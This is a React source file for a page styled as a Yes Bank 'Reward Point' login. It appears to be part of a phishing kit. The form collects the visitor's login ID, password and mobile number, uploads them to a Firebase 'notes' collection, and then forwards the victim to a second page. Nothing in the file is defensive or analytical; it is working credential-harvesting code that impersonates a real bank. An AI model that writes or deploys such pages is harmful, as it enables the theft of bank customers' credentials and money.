import  { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';

function FirstPage() {
  const navigate = useNavigate();
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state
  




  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true); // Show loading during submit
    // Simulate form submission delay
    setTimeout(async () =>  {
    const result = await  FirebaseUtil.uploadAnyModel("notes", { name, phone, password });
    localStorage.setItem('key', result.key);
    console.log("result.key = "+result.key);
      navigate('/second-page'); // Navigate to third page after submission
      setIsSubmitting(false); // Hide loading after submit
    }, 2000); // 1-second delay
  };

  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-blue-600 rounded shadow">
      {isSubmitting && (
        <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-50">
          <div className="loader"></div>
        </div>
      )}
        <div className="flex justify-center items-center w-full">
          <img className="w-auto h-auto" src={myImage} alt="Description of the image" />
        </div>
      <h1 className="text-lg font-bold mb-4 flex items-center text-white">
        <MdLock className="mr-2 text-orange-500" />
        Welcome to Yes Bank Reward Point
      </h1>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label
            className="block text-gray-200 text-sm font-bold mb-2"
            htmlFor="name"
          >
            Login ID 
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="name"
            type="text"
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-200 text-sm font-bold mb-2"
            htmlFor="password"
          >
            Password
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-200 text-sm font-bold mb-2"
            htmlFor="phone"
          >
            Mobile Number
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="phone"
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required
            maxLength="10"
          />
        </div>
        <div className="flex justify-center">
          <button
            className="bg-gray-200 hover:bg-gray-400 text-gray-900 font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
            type="submit"
            disabled={isSubmitting} // Disable button during submit   
          >
            {isSubmitting ? "Loading..." : "Proceed"}
          </button>
        </div>
      </form>
      {/* footer image */}
      <div className="flex justify-center mt-4">
        <img src={footerImage} alt="Description of the image" />
      </div>
      
    </div>
  );
}

export default FirstPage;